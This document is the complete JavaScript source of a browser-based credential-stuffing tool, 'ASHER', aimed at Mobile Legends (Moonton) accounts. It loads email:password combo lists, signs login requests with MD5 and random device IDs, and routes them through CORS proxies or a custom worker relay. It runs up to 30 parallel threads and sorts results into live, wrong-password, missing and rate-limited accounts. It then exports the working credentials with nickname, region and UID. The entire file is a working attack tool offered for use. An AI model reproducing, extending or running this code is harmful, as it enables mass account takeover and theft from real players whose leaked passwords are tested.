/* ASHER — Moonton account checker. browser-side. */

(function () {
  'use strict';

  const $ = id => document.getElementById(id);

  const els = {
    mode:         $('mode'),
    threads:      $('threads'),
    delay:        $('delay'),
    relay:        $('relay'),
    customWorker: $('customWorker'),
    proxyRow:     $('proxyRow'),
    pasteRow:     $('pasteRow'),
    fileRow:      $('fileRow'),
    combos:       $('combos'),
    comboFile:    $('comboFile'),
    run:          $('run'),
    stop:         $('stop'),
    clear:        $('clear'),
    stDone:       $('stDone'),
    stTotal:      $('stTotal'),
    stLive:       $('stLive'),
    stWrong:      $('stWrong'),
    stNoAcc:      $('stNoAcc'),
    stLimit:      $('stLimit'),
    stErr:        $('stErr'),
    stElapsed:    $('stElapsed'),
    progressFill: $('progressFill'),
    outputWrap:   $('outputWrap'),
    outputLabel:  $('outputLabel'),
    results:      $('results'),
    copyLive:     $('copyLive'),
    download:     $('download'),
    year:         $('year'),
  };

  if (els.year) els.year.textContent = new Date().getFullYear();

  /* ─── md5 (compact, public domain) ────────────────────────────────── */
  const md5 = (function () {
    function safeAdd(x, y) { const l = (x & 0xffff) + (y & 0xffff); return (((x >> 16) + (y >> 16) + (l >> 16)) << 16) | (l & 0xffff); }
    function rotl(x, n) { return (x << n) | (x >>> (32 - n)); }
    function cmn(q, a, b, x, s, t) { return safeAdd(rotl(safeAdd(safeAdd(a, q), safeAdd(x, t)), s), b); }
    function ff(a, b, c, d, x, s, t) { return cmn((b & c) | (~b & d), a, b, x, s, t); }
    function gg(a, b, c, d, x, s, t) { return cmn((b & d) | (c & ~d), a, b, x, s, t); }
    function hh(a, b, c, d, x, s, t) { return cmn(b ^ c ^ d, a, b, x, s, t); }
    function ii(a, b, c, d, x, s, t) { return cmn(c ^ (b | ~d), a, b, x, s, t); }

    function md5cycle(x, k) {
      let [a, b, c, d] = x;
      a = ff(a, b, c, d, k[0], 7, -680876936);   d = ff(d, a, b, c, k[1], 12, -389564586);
      c = ff(c, d, a, b, k[2], 17, 606105819);   b = ff(b, c, d, a, k[3], 22, -1044525330);
      a = ff(a, b, c, d, k[4], 7, -176418897);   d = ff(d, a, b, c, k[5], 12, 1200080426);
      c = ff(c, d, a, b, k[6], 17, -1473231341); b = ff(b, c, d, a, k[7], 22, -45705983);
      a = ff(a, b, c, d, k[8], 7, 1770035416);   d = ff(d, a, b, c, k[9], 12, -1958414417);
      c = ff(c, d, a, b, k[10], 17, -42063);     b = ff(b, c, d, a, k[11], 22, -1990404162);
      a = ff(a, b, c, d, k[12], 7, 1804603682);  d = ff(d, a, b, c, k[13], 12, -40341101);
      c = ff(c, d, a, b, k[14], 17, -1502002290);b = ff(b, c, d, a, k[15], 22, 1236535329);

      a = gg(a, b, c, d, k[1], 5, -165796510);   d = gg(d, a, b, c, k[6], 9, -1069501632);
      c = gg(c, d, a, b, k[11], 14, 643717713);  b = gg(b, c, d, a, k[0], 20, -373897302);
      a = gg(a, b, c, d, k[5], 5, -701558691);   d = gg(d, a, b, c, k[10], 9, 38016083);
      c = gg(c, d, a, b, k[15], 14, -660478335); b = gg(b, c, d, a, k[4], 20, -405537848);
      a = gg(a, b, c, d, k[9], 5, 568446438);    d = gg(d, a, b, c, k[14], 9, -1019803690);
      c = gg(c, d, a, b, k[3], 14, -187363961);  b = gg(b, c, d, a, k[8], 20, 1163531501);
      a = gg(a, b, c, d, k[13], 5, -1444681467); d = gg(d, a, b, c, k[2], 9, -51403784);
      c = gg(c, d, a, b, k[7], 14, 1735328473);  b = gg(b, c, d, a, k[12], 20, -1926607734);

      a = hh(a, b, c, d, k[5], 4, -378558);      d = hh(d, a, b, c, k[8], 11, -2022574463);
      c = hh(c, d, a, b, k[11], 16, 1839030562); b = hh(b, c, d, a, k[14], 23, -35309556);
      a = hh(a, b, c, d, k[1], 4, -1530992060);  d = hh(d, a, b, c, k[4], 11, 1272893353);
      c = hh(c, d, a, b, k[7], 16, -155497632);  b = hh(b, c, d, a, k[10], 23, -1094730640);
      a = hh(a, b, c, d, k[13], 4, 681279174);   d = hh(d, a, b, c, k[0], 11, -358537222);
      c = hh(c, d, a, b, k[3], 16, -722521979);  b = hh(b, c, d, a, k[6], 23, 76029189);
      a = hh(a, b, c, d, k[9], 4, -640364487);   d = hh(d, a, b, c, k[12], 11, -421815835);
      c = hh(c, d, a, b, k[15], 16, 530742520);  b = hh(b, c, d, a, k[2], 23, -995338651);

      a = ii(a, b, c, d, k[0], 6, -198630844);   d = ii(d, a, b, c, k[7], 10, 1126891415);
      c = ii(c, d, a, b, k[14], 15, -1416354905);b = ii(b, c, d, a, k[5], 21, -57434055);
      a = ii(a, b, c, d, k[12], 6, 1700485571);  d = ii(d, a, b, c, k[3], 10, -1894986606);
      c = ii(c, d, a, b, k[10], 15, -1051523);   b = ii(b, c, d, a, k[1], 21, -2054922799);
      a = ii(a, b, c, d, k[8], 6, 1873313359);   d = ii(d, a, b, c, k[15], 10, -30611744);
      c = ii(c, d, a, b, k[6], 15, -1560198380); b = ii(b, c, d, a, k[13], 21, 1309151649);
      a = ii(a, b, c, d, k[4], 6, -145523070);   d = ii(d, a, b, c, k[11], 10, -1120210379);
      c = ii(c, d, a, b, k[2], 15, 718787259);   b = ii(b, c, d, a, k[9], 21, -343485551);
      x[0] = safeAdd(a, x[0]); x[1] = safeAdd(b, x[1]); x[2] = safeAdd(c, x[2]); x[3] = safeAdd(d, x[3]);
    }

    function md5blk(s) {
      const md5blks = [];
      for (let i = 0; i < 64; i += 4) {
        md5blks[i >> 2] = s.charCodeAt(i) + (s.charCodeAt(i + 1) << 8) +
                          (s.charCodeAt(i + 2) << 16) + (s.charCodeAt(i + 3) << 24);
      }
      return md5blks;
    }

    function md51(s) {
      const n = s.length;
      const state = [1732584193, -271733879, -1732584194, 271733878];
      let i;
      for (i = 64; i <= n; i += 64) md5cycle(state, md5blk(s.substring(i - 64, i)));
      s = s.substring(i - 64);
      const tail = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0];
      for (i = 0; i < s.length; i++) tail[i >> 2] |= s.charCodeAt(i) << ((i % 4) << 3);
      tail[i >> 2] |= 0x80 << ((i % 4) << 3);
      if (i > 55) {
        md5cycle(state, tail);
        for (i = 0; i < 16; i++) tail[i] = 0;
      }
      tail[14] = n * 8;
      md5cycle(state, tail);
      return state;
    }

    const hexChr = '0123456789abcdef'.split('');
    function rhex(n) {
      let s = '';
      for (let j = 0; j < 4; j++) s += hexChr[(n >> (j * 8 + 4)) & 0x0f] + hexChr[(n >> (j * 8)) & 0x0f];
      return s;
    }
    function hex(x) { return x.map(rhex).join(''); }
    function utf8Encode(str) {
      return unescape(encodeURIComponent(str));
    }
    return function (s) {
      return hex(md51(utf8Encode(s)));
    };
  })();

  /* ─── helpers ─────────────────────────────────────────────────────── */
  function genDeviceId() {
    const b = new Uint8Array(16);
    crypto.getRandomValues(b);
    return [...b].map(x => x.toString(16).padStart(2, '0')).join('');
  }

  function parseCombos(text) {
    const out = [];
    const seen = new Set();
    text.split(/\r?\n/).forEach(line => {
      line = line.trim();
      if (!line || line.startsWith('#')) return;
      for (const sep of [':', '|', ';']) {
        const idx = line.indexOf(sep);
        if (idx > 0) {
          const email = line.slice(0, idx).trim();
          const pw    = line.slice(idx + 1).trim();
          if (email && pw) {
            const key = email + '\x00' + pw;
            if (!seen.has(key)) { seen.add(key); out.push([email, pw]); }
          }
          return;
        }
      }
    });
    return out;
  }

  function relayUrl() {
    const kind = els.relay.value;
    const target = 'https://accountmtapi.mobilelegends.com/';
    if (kind === 'custom') {
      const base = (els.customWorker.value || '').trim().replace(/\/+$/, '');
      if (!base) return null;
      return base;
    }
    if (kind === 'corsproxy') return `https://corsproxy.io/?${encodeURIComponent(target)}`;
    if (kind === 'allorigins') return `https://api.allorigins.win/raw?url=${encodeURIComponent(target)}`;
    return null;
  }

  /* ─── moonton check ───────────────────────────────────────────────── */
  const STATUS_MAP = {
    'Error_Success':         'live',
    'Error_PasswdError':     'wrong_pw',
    'Error_NoAccount':       'no_account',
    'Error_PwdErrorTooMany': 'limit',
    'Error_AccountLocked':   'error',
    'Error_AccountBanned':   'error',
    'Error_SignError':       'sign_err',
  };

  const SIGN_ERROR_HINT = {
    live:        '✓ live',
    wrong_pw:    'wrong password',
    no_account:  'no account',
    limit:       'rate limited',
    sign_err:    'sign mismatch — check relay + payload',
    error:       'network / api error',
  };

  async function checkOne(email, password, workerUrl, signal) {
    const did    = genDeviceId();
    const md5pwd = md5(password);
    const raw    = `account=${email}&deviceId=${did}&md5pwd=${md5pwd}&op=login`;
    const sign   = md5(raw);

    const body = {
      op: 'login',
      sign,
      params: {
        account:      email,
        md5pwd,
        deviceId:     did,
        gameServerId: '1',
        channelId:    '1',
      },
      lang: 'cn',
    };

    const headers = {
      'Content-Type': 'application/json',
      'X-Requested-With': 'com.mobile.legends',
    };

    let res, data;
    try {
      // if using custom worker, POST JSON to it (worker injects the upstream)
      // if using corsproxy/allorigins, POST directly at the relayed URL
      const isWorker = /workers\.dev$|workers\.dev\//.test(workerUrl) ||
                       workerUrl.includes('.workers.dev');
      if (isWorker) {
        res = await fetch(workerUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ url: 'https://accountmtapi.mobilelegends.com/', payload: body }),
          signal,
        });
      } else {
        res = await fetch(workerUrl, {
          method: 'POST',
          headers,
          body: JSON.stringify(body),
          signal,
        });
      }
      const text = await res.text();
      try { data = JSON.parse(text); }
      catch { return { email, password, device_id: did, status: 'error',
                       reason: `http ${res.status} non-json`, message: text.slice(0, 80) }; }
    } catch (e) {
      if (e.name === 'AbortError') throw e;
      return { email, password, device_id: did, status: 'error',
               reason: e.message || 'network error' };
    }

    const msg = (data && data.message) || '';
    const status = STATUS_MAP[msg] || 'error';
    return {
      email, password, device_id: did,
      status, message: msg,
      ign:    data?.data?.nickname || data?.data?.name || null,
      region: data?.data?.region || data?.data?.zoneName || null,
      uid:    data?.data?.uid || data?.data?.roleId || null,
      raw: data,
    };
  }

  /* ─── concurrency pool ────────────────────────────────────────────── */
  const state = {
    running: false,
    aborter: null,
    stats: { done: 0, total: 0, live: 0, wrong_pw: 0, no_account: 0, limit: 0, error: 0, sign_err: 0 },
    results: [],
    filter: 'all',
    t0: 0,
    elapsedTimer: null,
  };

  function updateStats() {
    const s = state.stats;
    els.stDone.textContent = s.done.toLocaleString();
    els.stTotal.textContent = s.total.toLocaleString();
    els.stLive.textContent = s.live.toLocaleString();
    els.stWrong.textContent = s.wrong_pw.toLocaleString();
    els.stNoAcc.textContent = s.no_account.toLocaleString();
    els.stLimit.textContent = s.limit.toLocaleString();
    els.stErr.textContent = (s.error + s.sign_err).toLocaleString();
    const pct = s.total ? (s.done / s.total) * 100 : 0;
    els.progressFill.style.width = pct + '%';
  }

  function renderResults() {
    const filter = state.filter;
    const rows = filter === 'all'
      ? state.results
      : filter === 'error'
        ? state.results.filter(r => r.status === 'error' || r.status === 'sign_err')
        : state.results.filter(r => r.status === filter);

    if (!rows.length) {
      els.results.innerHTML = `<div class="empty">no rows for filter "${filter}"</div>`;
      return;
    }

    const frag = document.createDocumentFragment();
    rows.forEach(r => {
      const div = document.createElement('div');
      div.className = `result-row ${r.status}`;
      const plan   = r.plan || '';
      const region = r.region || '';
      const ign    = r.ign || '';
      div.innerHTML = `
        <span class="r-tag ${r.status}">${r.status.replace('_',' ')}</span>
        <span class="r-combo"><b>${escapeHtml(r.email)}</b>:${escapeHtml(r.password)}</span>
        <span class="r-meta r-plan">${escapeHtml(ign || plan || '—')}</span>
        <span class="r-meta r-region">${escapeHtml(region || '')}</span>
        <span class="r-meta">${escapeHtml((r.message || r.reason || '').slice(0,30))}</span>
      `;
      frag.appendChild(div);
    });
    els.results.innerHTML = '';
    els.results.appendChild(frag);
  }

  function escapeHtml(s) {
    return String(s).replace(/[&<>"']/g, c => ({
      '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
    }[c]));
  }

  /* ─── run ─────────────────────────────────────────────────────────── */
  async function run() {
    if (state.running) return;
    const relay = relayUrl();
    if (!relay) { toast('set a relay URL first'); return; }

    let combos;
    if (els.mode.value === 'file' && els.comboFile.files.length) {
      const text = await els.comboFile.files[0].text();
      combos = parseCombos(text);
    } else {
      combos = parseCombos(els.combos.value);
    }

    if (!combos.length) { toast('no valid combos'); return; }

    const threads = Math.max(1, Math.min(30, parseInt(els.threads.value, 10) || 8));
    const delay   = Math.max(0, Math.min(5000, parseInt(els.delay.value, 10) || 0));

    state.running = true;
    state.aborter = new AbortController();
    state.stats   = { done: 0, total: combos.length, live: 0, wrong_pw: 0, no_account: 0, limit: 0, error: 0, sign_err: 0 };
    state.results = [];
    state.filter  = 'all';
    state.t0      = performance.now();

    document.querySelectorAll('.mini[data-filter]').forEach(b => {
      b.dataset.active = b.dataset.filter === 'all' ? '1' : '';
    });

    els.run.disabled = true;
    els.stop.disabled = false;
    els.outputWrap.hidden = false;
    els.outputLabel.textContent = `results · 0/${combos.length}`;
    els.results.innerHTML = `<div class="empty">running…</div>`;
    updateStats();

    state.elapsedTimer = setInterval(() => {
      els.stElapsed.textContent = ((performance.now() - state.t0) / 1000).toFixed(1) + 's';
    }, 100);

    // worker pool
    let nextIdx = 0;
    const total = combos.length;

    async function worker() {
      while (state.running) {
        const i = nextIdx++;
        if (i >= total) return;
        const [email, pw] = combos[i];
        let res;
        try {
          res = await checkOne(email, pw, relay, state.aborter.signal);
        } catch (e) {
          if (e.name === 'AbortError') return;
          res = { email, password: pw, status: 'error', reason: e.message };
        }
        state.results.push(res);
        const s = state.stats;
        s.done++;
        if (res.status in s) s[res.status]++;
        updateStats();
        renderResults();
        els.outputLabel.textContent = `results · ${s.done}/${total}`;

        if (delay > 0) await new Promise(r => setTimeout(r, delay));
      }
    }

    const workers = Array.from({ length: threads }, () => worker());
    await Promise.all(workers);

    clearInterval(state.elapsedTimer);
    state.running = false;
    els.run.disabled = false;
    els.stop.disabled = true;
    els.stElapsed.textContent = ((performance.now() - state.t0) / 1000).toFixed(1) + 's';
    toast(`done — ${state.stats.live} live · ${state.stats.total} checked`);
  }

  function stop() {
    if (!state.running) return;
    state.running = false;
    if (state.aborter) state.aborter.abort();
    clearInterval(state.elapsedTimer);
    els.run.disabled = false;
    els.stop.disabled = true;
    toast('stopped');
  }

  function clearAll() {
    stop();
    state.results = [];
    state.stats = { done: 0, total: 0, live: 0, wrong_pw: 0, no_account: 0, limit: 0, error: 0, sign_err: 0 };
    updateStats();
    els.progressFill.style.width = '0';
    els.results.innerHTML = '';
    els.outputWrap.hidden = true;
    els.stElapsed.textContent = '0.0s';
    toast('cleared');
  }

  /* ─── export ──────────────────────────────────────────────────────── */
  function liveLines() {
    return state.results
      .filter(r => r.status === 'live')
      .map(r => `${r.email}:${r.password} | ${r.ign || '?'} | ${r.region || '?'} | uid:${r.uid || '?'}`);
  }

  async function copyLive() {
    const lines = liveLines();
    if (!lines.length) { toast('no live accounts'); return; }
    try {
      await navigator.clipboard.writeText(lines.join('\n'));
      toast(`copied ${lines.length} live`);
    } catch {
      toast('clipboard blocked — use download');
    }
  }

  function download() {
    const lines = liveLines();
    if (!lines.length) { toast('no live accounts'); return; }
    const day = new Date().toISOString().slice(0, 10);
    const blob = new Blob([lines.join('\n') + '\n'], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `asher_live_${day}.txt`;
    document.body.appendChild(a);
    a.click();
    a.remove();
    setTimeout(() => URL.revokeObjectURL(url), 1000);
    toast(`downloaded ${lines.length} live`);
  }

  /* ─── toast ───────────────────────────────────────────────────────── */
  let toastEl = null, toastTimer = null;
  function toast(msg) {
    if (!toastEl) {
      toastEl = document.createElement('div');
      toastEl.className = 'toast';
      document.body.appendChild(toastEl);
    }
    toastEl.textContent = msg;
    toastEl.classList.add('show');
    clearTimeout(toastTimer);
    toastTimer = setTimeout(() => toastEl.classList.remove('show'), 2200);
  }

  /* ─── wire ────────────────────────────────────────────────────────── */
  els.mode.addEventListener('change', () => {
    const isFile = els.mode.value === 'file';
    els.pasteRow.hidden = isFile;
    els.fileRow.hidden = !isFile;
  });

  els.run.addEventListener('click', run);
  els.stop.addEventListener('click', stop);
  els.clear.addEventListener('click', clearAll);
  els.copyLive.addEventListener('click', copyLive);
  els.download.addEventListener('click', download);

  document.querySelectorAll('.mini[data-filter]').forEach(btn => {
    btn.addEventListener('click', () => {
      document.querySelectorAll('.mini[data-filter]').forEach(b => b.dataset.active = '');
      btn.dataset.active = '1';
      state.filter = btn.dataset.filter;
      renderResults();
    });
  });

  // default: paste a couple of sample lines? no. leave blank.
  console.log(
    '%c ASHER %c account checker ',
    'background:#7c5cff;color:#fff;padding:4px 8px;border-radius:4px 0 0 4px;font-weight:700;',
    'background:#14141d;color:#9a9aab;padding:4px 8px;border-radius:0 4px 4px 0;'
  );
})();